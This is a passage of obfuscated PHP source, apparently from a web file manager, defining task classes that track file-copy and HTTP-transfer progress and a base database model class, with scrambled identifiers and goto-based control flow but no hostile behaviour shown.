$aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[994]] += $cÜˆÈåé∫Ö; $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1421]] = timeFloat(); if ($aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[982]]) { if ($aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[982]] < $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[994]]) { $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[982]] = $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[994]]; } $f∏ÙÉ›íÕ∫ = timeFloat() - $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1420]] - $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1423]]; $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1418]] = $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[994]] / $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[982]]; $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1419]] = $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[994]] / $f∏ÙÉ›íÕ∫; if ($aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1418]] > 0) { $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1424]] = $f∏ÙÉ›íÕ∫ * (1 - $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1418]]) / $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1418]]; } $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1424]] = $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1424]] <= 0 ? 0 : $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1424]]; } goto cÌïÎåöåã; c©™ä¡ªåö: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($F¨◊»ËÉÆ¯) { $b¶ã–’πﬁÃ =& $_SERVER[—Ω]; Cache::set($b¶ã–’πﬁÃ[1434] . $this->task[$b¶ã–’πﬁÃ[364]], $F¨◊»ËÉÆ¯, 60); return $F¨◊»ËÉÆ¯; } public static function get($a⁄âÌ‹ñÛª) { return self::valueGet($a⁄âÌ‹ñÛª); } public static function listData() { $b‰º≤óìâÛ = self::valueGet(); return array_sort_by($b‰º≤óìâÛ, $_SERVER[—Ω][1420], !0); } public static function kill($E•äÚàÌœ…) { return self::changeStatus($E•äÚàÌœ…, self::STATYS_KILL); } public static function stop($D¥Ôº™èÜ—) { return self::changeStatus($D¥Ôº™èÜ—, self::STATYS_STOP); } public static function restart($aµ∫ã∞îı˜) { return self::changeStatus($aµ∫ã∞îı˜, self::STATYS_RUNNING); } public static function killAll() { $c¯˜ËŸõ‰· =& $_SERVER[—Ω]; $CÖŒÕå‹–Û = self::listData(); foreach ($CÖŒÕå‹–Û as $e≤óÍê ‹ß) { self::kill($e≤óÍê ‹ß[$c¯˜ËŸõ‰·[364]]); } sleep(2); foreach ($CÖŒÕå‹–Û as $e≤óÍê ‹ß) { self::valueSet($e≤óÍê ‹ß[$c¯˜ËŸõ‰·[364]], !1); } } private static function changeStatus($B∞è°ô£˘£, $c¡Ãç§ïÃÑ) { goto b”å¥˜öü¯; Dìäßœ ÷€: return !0; goto c˘úêñøù; Eèâß¨£ê—: $dƒÕãá„¬∆[$bÈ¨ê∑›Òë[699]] = $c¡Ãç§ïÃÑ; self::valueSet($B∞è°ô£˘£, $dƒÕãá„¬∆); self::log($bÈ¨ê∑›Òë[1436] . $dƒÕãá„¬∆[$bÈ¨ê∑›Òë[364]] . $bÈ¨ê∑›Òë[1437] . $c¡Ãç§ïÃÑ); goto Dìäßœ ÷€; b”å¥˜öü¯: $bÈ¨ê∑›Òë =& $_SERVER[—Ω]; $dƒÕãá„¬∆ = self::valueGet($B∞è°ô£˘£); if (!$dƒÕãá„¬∆) { return !1; } goto Eèâß¨£ê—; c˘úêñøù: } public static function valueGet($C«’·∞Ñ»Ç = false) { $Eƒ±∑†πÖå =& $_SERVER[—Ω]; if ($C«’·∞Ñ»Ç) { $cµƒûé§ê— = Model($Eƒ±∑†πÖå[395])->where(array($Eƒ±∑†πÖå[89] => $C«’·∞Ñ»Ç, $Eƒ±∑†πÖå[29] => $Eƒ±∑†πÖå[1438]))->find(); return $cµƒûé§ê— ? json_decode($cµƒûé§ê—[$Eƒ±∑†πÖå[356]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($b≈û‡´∂πå = false) { goto e âá⁄–¨ß; aº√ó÷É∑á: $aëÈ∞é≥™˜ = Model($E‘Ÿéº¯´ß[395])->where($FÈ¿œÒ‘Ôß)->select(); $aëÈ∞é≥™˜ = $aëÈ∞é≥™˜ ? $aëÈ∞é≥™˜ : array(); foreach ($aëÈ∞é≥™˜ as $B≠ëÍƒ¥éó => $dÛ•ù∫ïƒì) { $aëÈ∞é≥™˜[$B≠ëÍƒ¥éó] = json_decode($dÛ•ù∫ïƒì[$E‘Ÿéº¯´ß[356]], !0); } goto E¡ò¢‰ƒüí; E¡ò¢‰ƒüí: return $aëÈ∞é≥™˜; goto fØß√§¬ÀÚ; e âá⁄–¨ß: $E‘Ÿéº¯´ß =& $_SERVER[—Ω]; $FÈ¿œÒ‘Ôß = array($E‘Ÿéº¯´ß[29] => $E‘Ÿéº¯´ß[1438]); if ($b≈û‡´∂πå) { $FÈ¿œÒ‘Ôß[$E‘Ÿéº¯´ß[1417]] = $b≈û‡´∂πå; } goto aº√ó÷É∑á; fØß√§¬ÀÚ: } public static function valueSet($F£à…∞åïç, $CŸï˜„´ò÷) { goto dúŒÂ⁄Ú¯Õ; dıìÓÃà∑—: Model($EñÓ ò¡ı≠[395])->add($dÇÑ…∏ê’Ú, array(), !0); goto dÇ√ì´åãÑ; dúŒÂ⁄Ú¯Õ: $EñÓ ò¡ı≠ =& $_SERVER[—Ω]; if (!$CŸï˜„´ò÷) { return Model($EñÓ ò¡ı≠[395])->where(array($EñÓ ò¡ı≠[89] => $F£à…∞åïç, $EñÓ ò¡ı≠[29] => $EñÓ ò¡ı≠[1438]))->delete(); } $C›âÚÛÍó€ = json_encode($CŸï˜„´ò÷); goto AµíÓ–›èá; AµíÓ–›èá: if (!$C›âÚÛÍó€) { ob_start(); var_dump($CŸï˜„´ò÷); $cØˆ∞¯®¿ƒ = ob_get_clean(); self::log($EñÓ ò¡ı≠[1439] . json_encode_force($cØˆ∞¯®¿ƒ)); } if (!$F£à…∞åïç || !$CŸï˜„´ò÷[$EñÓ ò¡ı≠[364]]) { return !1; } $dÇÑ…∏ê’Ú = array($EñÓ ò¡ı≠[29] => $EñÓ ò¡ı≠[1438], $EñÓ ò¡ı≠[1417] => USER_ID, $EñÓ ò¡ı≠[89] => $F£à…∞åïç, $EñÓ ò¡ı≠[356] => $C›âÚÛÍó€); goto dıìÓÃà∑—; dÇ√ì´åãÑ: } public static function log($B©èÏÊÙœÓ) { write_log($B©èÏÊÙœÓ, $_SERVER[—Ω][1440]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto e»õí˘Ç¶ò; BÇ¬Øä˘ﬁı: $cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[1460]] = LNG($Dò≈ó±‡”Æ[1461]); $cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[1462]] = 0; $cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[1463]] = 0; goto DÑ¥«¶≥Ü¯; eﬁÏÎ≈Ë‡Ç: Hook::bind($Dò≈ó±‡”Æ[539], array($this, $Dò≈ó±‡”Æ[1449])); Hook::bind($Dò≈ó±‡”Æ[505], array($this, $Dò≈ó±‡”Æ[1450])); Hook::bind($Dò≈ó±‡”Æ[502], array($this, $Dò≈ó±‡”Æ[1450])); goto d˘†‰–®Â‰; DÑ¥«¶≥Ü¯: $cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[984]] = $Dò≈ó±‡”Æ[33]; $cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[1464]] = $Dò≈ó±‡”Æ[33]; $cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[1465]] = 0; goto C≈∑É√Ø»; d˘†‰–®Â‰: Hook::bind($Dò≈ó±‡”Æ[507], array($this, $Dò≈ó±‡”Æ[1450])); Hook::bind($Dò≈ó±‡”Æ[509], array($this, $Dò≈ó±‡”Æ[1450])); Hook::bind($Dò≈ó±‡”Æ[511], array($this, $Dò≈ó±‡”Æ[1450])); goto c‘å†¨âˆò; cë≤¿πÉŒ•: Hook::bind($Dò≈ó±‡”Æ[1454], array($this, $Dò≈ó±‡”Æ[1455])); Hook::bind($Dò≈ó±‡”Æ[1456], array($this, $Dò≈ó±‡”Æ[1457])); Hook::bind($Dò≈ó±‡”Æ[1458], array($this, $Dò≈ó±‡”Æ[1459])); goto BÇ¬Øä˘ﬁı; e»õí˘Ç¶ò: $Dò≈ó±‡”Æ =& $_SERVER[—Ω]; $cÀ‰∫≠Áî” =& $this->task; $this->sourceCopyFolder = !1; goto f‚ã£âØ¥ë; f‚ã£âØ¥ë: Hook::bind($Dò≈ó±‡”Æ[1441], array($this, $Dò≈ó±‡”Æ[1442])); Hook::bind($Dò≈ó±‡”Æ[1443], array($this, $Dò≈ó±‡”Æ[1444])); Hook::bind($Dò≈ó±‡”Æ[1445], array($this, $Dò≈ó±‡”Æ[1446])); goto D‚≠ô›¯¯€; C≈∑É√Ø»: if (!$cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[1325]]) { $cÀ‰∫≠Áî”[$Dò≈ó±‡”Æ[1325]] = LNG($Dò≈ó±‡”Æ[1466]); } goto dΩç≤ÙüŒÖ; c‘å†¨âˆò: Hook::bind($Dò≈ó±‡”Æ[1451], array($this, $Dò≈ó±‡”Æ[1452])); Hook::bind($Dò≈ó±‡”Æ[528], array($this, $Dò≈ó±‡”Æ[1453])); $this->sourceModelCopyFlag = !1; goto cë≤¿πÉŒ•; D‚≠ô›¯¯€: Hook::bind($Dò≈ó±‡”Æ[535], array($this, $Dò≈ó±‡”Æ[1447])); Hook::bind($Dò≈ó±‡”Æ[536], array($this, $Dò≈ó±‡”Æ[1448])); Hook::bind($Dò≈ó±‡”Æ[538], array($this, $Dò≈ó±‡”Æ[1449])); goto eﬁÏÎ≈Ë‡Ç; dΩç≤ÙüŒÖ: } protected function endAfter() { goto bº‚∞Û§ÕÉ; EüûÔôêÚ¢: Hook::unbind($dÿÑ∏‚·¿‚[502], array($this, $dÿÑ∏‚·¿‚[1450])); Hook::unbind($dÿÑ∏‚·¿‚[507], array($this, $dÿÑ∏‚·¿‚[1450])); Hook::unbind($dÿÑ∏‚·¿‚[509], array($this, $dÿÑ∏‚·¿‚[1450])); goto Aã∏∆êÜàÇ; a—“Ñ£ï°: Hook::unbind($dÿÑ∏‚·¿‚[1454], array($this, $dÿÑ∏‚·¿‚[1455])); Hook::unbind($dÿÑ∏‚·¿‚[1456], array($this, $dÿÑ∏‚·¿‚[1457])); Hook::unbind($dÿÑ∏‚·¿‚[1458], array($this, $dÿÑ∏‚·¿‚[1459])); goto aË√„Ó€®á; Aã∏∆êÜàÇ: Hook::unbind($dÿÑ∏‚·¿‚[511], array($this, $dÿÑ∏‚·¿‚[1450])); Hook::unbind($dÿÑ∏‚·¿‚[1451], array($this, $dÿÑ∏‚·¿‚[1452])); Hook::unbind($dÿÑ∏‚·¿‚[528], array($this, $dÿÑ∏‚·¿‚[1453])); goto a—“Ñ£ï°; dŒ®¿Á ø: Hook::unbind($dÿÑ∏‚·¿‚[1445], array($this, $dÿÑ∏‚·¿‚[1446])); Hook::unbind($dÿÑ∏‚·¿‚[535], array($this, $dÿÑ∏‚·¿‚[1447])); Hook::unbind($dÿÑ∏‚·¿‚[536], array($this, $dÿÑ∏‚·¿‚[1448])); goto d…ı©ﬂ≠Ñ•; bº‚∞Û§ÕÉ: $dÿÑ∏‚·¿‚ =& $_SERVER[—Ω]; Hook::unbind($dÿÑ∏‚·¿‚[1441], array($this, $dÿÑ∏‚·¿‚[1442])); Hook::unbind($dÿÑ∏‚·¿‚[1443], array($this, $dÿÑ∏‚·¿‚[1444])); goto dŒ®¿Á ø; d…ı©ﬂ≠Ñ•: Hook::unbind($dÿÑ∏‚·¿‚[538], array($this, $dÿÑ∏‚·¿‚[1449])); Hook::unbind($dÿÑ∏‚·¿‚[539], array($this, $dÿÑ∏‚·¿‚[1449])); Hook::unbind($dÿÑ∏‚·¿‚[505], array($this, $dÿÑ∏‚·¿‚[1450])); goto EüûÔôêÚ¢; aË√„Ó€®á: } public function copyMoveStart($Eﬁ…“ª∏ä€, $dëÔûÔöøÎ, $b‘≥˜â“áÇ, $bË›ø‡ÌáÙ) { } public function updateAfter() { goto cè”ù‰‘”Ù; CˆÛóÏ—•£: $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1418]] = ($açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1467]] + $a œø™‹Ê«) / $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[708]]; if ($açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1418]] > 0) { $fÆÎüó‰ÆÁ = timeFloat() - $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1420]] - $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1423]]; $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1424]] = $fÆÎüó‰ÆÁ * (1 - $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1418]]) / $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1418]]; } goto Aäƒ‘ú›Æ‰; cè”ù‰‘”Ù: $Bèáﬂ‘æΩ‚ =& $_SERVER[—Ω]; $açëﬂËÒË√ =& $this->task; if (!$açëﬂËÒË√[$Bèáﬂ‘æΩ‚[708]]) { return; } goto C‡§ëÊ§‹ú; C‡§ëÊ§‹ú: if ($this->sourceModelCopyFlag) { return; } $a œø™‹Ê« = 0; if ($açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1464]] == $Bèáﬂ‘æΩ‚[1044]) { $a œø™‹Ê« = $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1463]] * 0.5; } else { if ($açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1464]] == $Bèáﬂ‘æΩ‚[91]) { $a œø™‹Ê« = $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1463]] * 0.5 + $açëﬂËÒË√[$Bèáﬂ‘æΩ‚[1462]] * 0.5; } } goto CˆÛóÏ—•£; Aäƒ‘ú›Æ‰: } public function addPath($BØ∂Æ‚º≤÷) { goto aÀ‰ê¨Áµã; dî©»ÓŸ‚†: $CÇÊ“Îà–Ÿ = IO::infoWithChildren($BØ∂Æ‚º≤÷); $e¥€ΩﬂŒëã = $e®ßªœá»Œ[$CªÚ»Øô„õ[1468]] ? $e®ßªœá»Œ[$CªÚ»Øô„õ[1468]][$CªÚ»Øô„õ[1469]] : 0; $e®ßªœá»Œ[$CªÚ»Øô„õ[1468]] = array($CªÚ»Øô„õ[1469] => $e¥€ΩﬂŒëã + 1, $CªÚ»Øô„õ[383] => $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[28]], $CªÚ»Øô„õ[75] => $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[75]], $CªÚ»Øô„õ[462] => $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[462]] ? $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[462]] : $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[75]]); goto dŒà‰Éê∞Œ; dŒà‰Éê∞Œ: if ($CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[29]] == $CªÚ»Øô„õ[164]) { $e®ßªœá»Œ[$CªÚ»Øô„õ[982]] += 1; } else { $e®ßªœá»Œ[$CªÚ»Øô„õ[982]] += $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[80]][$CªÚ»Øô„õ[78]]; if ($CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[366]]) { $e®ßªœá»Œ[$CªÚ»Øô„õ[982]] += $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[80]][$CªÚ»Øô„õ[79]] + 1; } } $e®ßªœá»Œ[$CªÚ»Øô„õ[708]] += $CÇÊ“Îà–Ÿ[$CªÚ»Øô„õ[77]]; $this->update(); goto D•êÀÉª„Ü; aÀ‰ê¨Áµã: $CªÚ»Øô„õ =& $_SERVER[—Ω]; if (!$BØ∂Æ‚º≤÷) { return; } $e®ßªœá»Œ =& $this->task; goto dî©»ÓŸ‚†; D•êÀÉª„Ü: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($f≠í˘íÏΩˆ) { $e∑ë‹›©®˘ =& $_SERVER[—Ω]; $cá›Ã‰Û˜† =& $this->task; $cá›Ã‰Û˜†[$e∑ë‹›©®˘[1460]] = $f≠í˘íÏΩˆ[$e∑ë‹›©®˘[28]]; $cá›Ã‰Û˜†[$e∑ë‹›©®˘[984]] = $f≠í˘íÏΩˆ[$e∑ë‹›©®˘[28]]; $this->update(); } public function copyFileStart($DØŸÜê˘ãÉ, $Cé§ìê—Ë, $aìÃ∞ÇñÃÁ, $F◊›ÚïÃ¶Æ, $aêà»©¿ﬂ, $BíÉ≥Ë¡≈∂) { goto aø´¶π∆Û•; eƒàˆâÇ‡: $B‹ À∏¶Ôœ[$aŒÖ¯”åòƒ[1460]] = $FÈöæ≈Áõá; $B‹ À∏¶Ôœ[$aŒÖ¯”åòƒ[1462]] = (int) $DØŸÜê˘ãÉ->size($Cé§ìê—Ë); $B‹ À∏¶Ôœ[$aŒÖ¯”åòƒ[1463]] = 0; goto a‘›Ô‹‘µ ; aÜÎ¯ı–‘¨: $this->update(); goto D—ùèêñ™˘; a‘›Ô‹‘µ : $B‹ À∏¶Ôœ[$aŒÖ¯”åòƒ[984]] = $aŒÖ¯”åòƒ[33]; $B‹ À∏¶Ôœ[$aŒÖ¯”åòƒ[1464]] = $aŒÖ¯”åòƒ[33]; $B‹ À∏¶Ôœ[$aŒÖ¯”åòƒ[1465]] = 0; goto aÜÎ¯ı–‘¨; Bß•–È°ßà: $GLOBALS[$aŒÖ¯”åòƒ[1471]] = $aêà»©¿ﬂ; $GLOBALS[$aŒÖ¯”åòƒ[1470]] = $BíÉ≥Ë¡≈∂; $B‹ À∏¶Ôœ =& $this->task; goto eƒàˆâÇ‡; aø´¶π∆Û•: $aŒÖ¯”åòƒ =& $_SERVER[—Ω]; $FÈöæ≈Áõá = $aêà»©¿ﬂ; if ($FÈöæ≈Áõá == $GLOBALS[$aŒÖ¯”åòƒ[1470]]) { $FÈöæ≈Áõá = $GLOBALS[$aŒÖ¯”åòƒ[1471]]; } goto Bß•–È°ßà; D—ùèêñ™˘: } public function copyFileEnd($a™≥ƒ§Ö≤Ø, $Dƒ¯¶¯Á›, $d∑ˆ≤äÉΩÒ, $c‘‚Â„î›ä, $BÕ•Ñóﬂ‡è, $dõ„ ˜õ°Ö) { $a˜‹±„ÖœÊ =& $_SERVER[—Ω]; $FÊ∂£ÉºÔã =& $this->task; $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1463]] = $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1462]]; $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1464]] = $a˜‹±„ÖœÊ[33]; if ($BÕ•Ñóﬂ‡è == $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1460]]) { $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1467]] += $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1462]]; $this->update(1); } else { $this->update(); $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1463]] = 0; } self::log($a˜‹±„ÖœÊ[1472] . $Dƒ¯¶¯Á› . $a˜‹±„ÖœÊ[66] . $c‘‚Â„î›ä . $a˜‹±„ÖœÊ[214] . $BÕ•Ñóﬂ‡è . $a˜‹±„ÖœÊ[1473] . $FÊ∂£ÉºÔã[$a˜‹±„ÖœÊ[1460]]); } public function updateFileEnd($eª©»“ëéΩ, $d¡Ÿ¿ÌÌ’¶) { $DÀÚ©úÚÀ… =& $_SERVER[—Ω]; $A©Ô⁄√∫áÌ =& $this->task; $A©Ô⁄√∫áÌ[$DÀÚ©úÚÀ…[1460]] = $eª©»“ëéΩ; $A©Ô⁄√∫áÌ[$DÀÚ©úÚÀ…[1462]] = $d¡Ÿ¿ÌÌ’¶; $A©Ô⁄√∫áÌ[$DÀÚ©úÚÀ…[1467]] += $d¡Ÿ¿ÌÌ’¶; $this->update(1); } public function sourceModelCopy($bπà‡Çë’ì) { goto B¬‡ãÜ“üÿ; EÕˆãÜÙÆã: switch ($b≠î⁄àıÉÜ) { case $bπ¬ã—›Ù‘[503]: $F∏Èõ°⁄≥Ω = 1; break; case $bπ¬ã—›Ù‘[506]: $AŸ√œ∫°ô°[$bπ¬ã—›Ù‘[1460]] = $fı£’•ô≥ÿ[$bπ¬ã—›Ù‘[28]]; break; case $bπ¬ã—›Ù‘[508]: $F∏Èõ°⁄≥Ω = intval($bπà‡Çë’ì[$bπ¬ã—›Ù‘[360]] * 0.4); break; case $bπ¬ã—›Ù‘[510]: $F∏Èõ°⁄≥Ω = intval($bπà‡Çë’ì[$bπ¬ã—›Ù‘[360]] * 0.2); break; case $bπ¬ã—›Ù‘[512]: $F∏Èõ°⁄≥Ω = intval($bπà‡Çë’ì[$bπ¬ã—›Ù‘[360]] * 0.4); break; } $this->update($F∏Èõ°⁄≥Ω); $this->sourceModelCopyFlag = !1; goto FœáàÎîˆÛ; B¬‡ãÜ“üÿ: $bπ¬ã—›Ù‘ =& $_SERVER[—Ω]; $b≠î⁄àıÉÜ = $bπà‡Çë’ì[0]; $fı£’•ô≥ÿ = $bπà‡Çë’ì[1]; goto CØı¯¬â ; CØı¯¬â : $AŸ√œ∫°ô° =& $this->task; $this->sourceModelCopyFlag = !0; $F∏Èõ°⁄≥Ω = 0; goto EÕˆãÜÙÆã; FœáàÎîˆÛ: } public function sourceRemove($cëÒç§øå“, $cÏõä¥‹úº) { $BÀûÍáòÂΩ =& $_SERVER[—Ω]; $this->sourceModelCopyFlag = !0; $AÚØùçœíä = 1; if (isset($cëÒç§øå“[$BÀûÍáòÂΩ[80]])) { $AÚØùçœíä = $cëÒç§øå“[$BÀûÍáòÂΩ[80]][$BÀûÍáòÂΩ[78]] + $cëÒç§øå“[$BÀûÍáòÂΩ[80]][$BÀûÍáòÂΩ[79]] + 1; } $this->update($AÚØùçœíä); $this->sourceModelCopyFlag = !1; } public function sourceMove($f ≠¡ã‡ÑŸ) { $this->sourceRemove($f ≠¡ã‡ÑŸ, !1); } public function curlProgress($dÁ›ª◊Ñ∞π, $Bﬂ…√åâπ©, $C√Ì⁄ôòÃÚ, $EìÔ¶á®ä¥, $cë∏ﬂ√»∫…) { $c¬€ﬂÊÈË» =& $_SERVER[—Ω]; $Cí’Ã ú˘’ =& $this->task; if ($cë∏ﬂ√»∫… > 0) { $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[984]] = $c¬€ﬂÊÈË»[1474]; $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1464]] = $c¬€ﬂÊÈË»[91]; if ($Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1462]] == $EìÔ¶á®ä¥ || $EìÔ¶á®ä¥ > 1024 * 1024) { $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1463]] = $cë∏ﬂ√»∫…; } if ($Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1465]]) { $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1463]] = $cë∏ﬂ√»∫… + $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1465]]; } } else { if ($C√Ì⁄ôòÃÚ > 0) { if ($Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1462]] == $Bﬂ…√åâπ©) { $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1463]] = $C√Ì⁄ôòÃÚ; $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[984]] = $c¬€ﬂÊÈË»[1475]; $Cí’Ã ú˘’[$c¬€ﬂÊÈË»[1464]] = $c¬€ﬂÊÈË»[1044]; } } } $this->update(); } public function curlProgressStart($cç¿ƒµ∂ä€) { } public function curlProgressEnd($a§ÒŒ∆ﬂ§ﬁ) { $B∫É£ÂÔªö =& $_SERVER[—Ω]; $EêíπÀâ´§ =& $this->task; $aÏò›°·Íò = curl_getinfo($a§ÒŒ∆ﬂ§ﬁ); $B„âÍÌéñö = $aÏò›°·Íò[$B∫É£ÂÔªö[1476]]; if ($EêíπÀâ´§[$B∫É£ÂÔªö[1464]] == $B∫É£ÂÔªö[91] && $B„âÍÌéñö) { $EêíπÀâ´§[$B∫É£ÂÔªö[1465]] += $B„âÍÌéñö; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $b•Àπ¬ÿã  =& $_SERVER[—Ω]; Hook::bind($b•Àπ¬ÿã [1454], array($this, $b•Àπ¬ÿã [1477])); Hook::bind($b•Àπ¬ÿã [1456], array($this, $b•Àπ¬ÿã [1478])); Hook::bind($b•Àπ¬ÿã [1458], array($this, $b•Àπ¬ÿã [1479])); } protected function endAfter() { $dÚëªˆ‘ú =& $_SERVER[—Ω]; Hook::unbind($dÚëªˆ‘ú[1454], array($this, $dÚëªˆ‘ú[1477])); Hook::unbind($dÚëªˆ‘ú[1456], array($this, $dÚëªˆ‘ú[1478])); Hook::unbind($dÚëªˆ‘ú[1458], array($this, $dÚëªˆ‘ú[1479])); } public function progressStart($f±Õõ®öØã) { $dû¥ıç´Æ =& $_SERVER[—Ω]; $BÛπï·˘÷≥ = curl_getinfo($f±Õõ®öØã); self::log($dû¥ıç´Æ[1480] . $BÛπï·˘÷≥[$dû¥ıç´Æ[292]]); self::valueSet($this->task[$dû¥ıç´Æ[364]], $this->task); } public function progressEnd($A≤Îú€≥•Á) { $Böîπﬂâ”å =& $_SERVER[—Ω]; self::log($Böîπﬂâ”å[1481] . $this->task[$Böîπﬂâ”å[364]]); $this->end(); } public function progress($f¡ÀéµÛç—, $AÿÃ„Áßãë, $D‰»’õ—≤•, $CëöØﬂß±´, $Dòö†´ë⁄Ü) { $AÛÚßÙóí® =& $_SERVER[—Ω]; $CÌè”Ü∫üç =& $this->task; if ($Dòö†´ë⁄Ü > 0) { $CÌè”Ü∫üç[$AÛÚßÙóí®[982]] = $CÌè”Ü∫üç[$AÛÚßÙóí®[982]] == 0 ? $CëöØﬂß±´ : $CÌè”Ü∫üç[$AÛÚßÙóí®[982]]; $CÌè”Ü∫üç[$AÛÚßÙóí®[994]] = $Dòö†´ë⁄Ü; } else { if ($D‰»’õ—≤• > 0) { $CÌè”Ü∫üç[$AÛÚßÙóí®[982]] = $CÌè”Ü∫üç[$AÛÚßÙóí®[982]] == 0 ? $AÿÃ„Áßãë : $CÌè”Ü∫üç[$AÛÚßÙóí®[982]]; $CÌè”Ü∫üç[$AÛÚßÙóí®[994]] = $D‰»’õ—≤•; } } $this->update(); self::log("\160\x72\x6f\147\x72\145\163\x73\110\x74\164\160\72\x64\157\167\x6e\72{$D‰»’õ—≤•}\x2f{$AÿÃ„Áßãë}\x3b\x20\165\160\154\157\x61\x64\72{$Dòö†´ë⁄Ü}\x2f{$CëöØﬂß±´}\73"); } } goto câáé§∏Íµ; Aπ®õ•…Ú°: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\151\155\145", "\x74\x69\x6d\x65", "\x69\156\x73\x65\x72\164\x2c\165\160\x64\x61\164\145", "\x66\x75\156\143\164\x69\157\x6e"), array("\143\162\145\x61\164\x65\124\x69\155\145", "\164\x69\x6d\145", "\151\156\x73\145\x72\164", "\x66\165\x6e\143\x74\x69\x6f\156")); public function setDataAuto($A´¢í§–ßë) { $this->dataAuto = $A´¢í§–ßë; } public function __construct($dÃßõ…áŸê = '', $DÜÂ˜˘ªú¡ = '', $eÉç¥Â… ò = '') { parent::__construct($dÃßõ…áŸê, $DÜÂ˜˘ªú¡, $eÉç¥Â… ò); } public static function textEncode($EèñäıÖã¡) { if (!$EèñäıÖã¡) { return $EèñäıÖã¡; } $F—ºÇœ†—ò = json_encode($EèñäıÖã¡); $F—ºÇœ†—ò = preg_replace_callback($_SERVER[—Ω][339], function ($bò£ü€Ñ—) { return addslashes($bò£ü€Ñ—[0]); }, $F—ºÇœ†—ò); return json_decode($F—ºÇœ†—ò); } public static function textDecode($dÑüÆçÜæ’) { $eôß˜—÷ò’ =& $_SERVER[—Ω]; $E•„òçı•Ç = json_encode($dÑüÆçÜæ’); $E•„òçı•Ç = preg_replace_callback($eôß˜—÷ò’[340], function ($aÜÍÓ™Ô¥ú) { return $_SERVER[—Ω][95]; }, $E•„òçı•Ç); return json_decode($E•„òçı•Ç); } protected $tableMeta = array(); protected function _beforeInsert(&$C·ÚÂ⁄¡€¢, $C‘«Ô˘¢Üº) { $F¿ôÙ›´æ™ =& $_SERVER[—Ω]; if (!$this->checkDataAutoHas($F¿ôÙ›´æ™[341])) { return; } $this->dataBeforeFilter($C·ÚÂ⁄¡€¢, $F¿ôÙ›´æ™[341]); } protected function _beforeUpdate(&$aÊﬂîç˜û¬, $Dú∏¨•ﬁ÷ﬁ) { $bï…Òª’≤Ã =& $_SERVER[—Ω]; if (!$this->checkDataAutoHas($bï…Òª’≤Ã[342])) { return; } $this->dataBeforeFilter($aÊﬂîç˜û¬, $bï…Òª’≤Ã[342]); } protected function _afterSelect(&$Cï∑£æìâƒ, $DÛÉÖ„˘éñ) { if 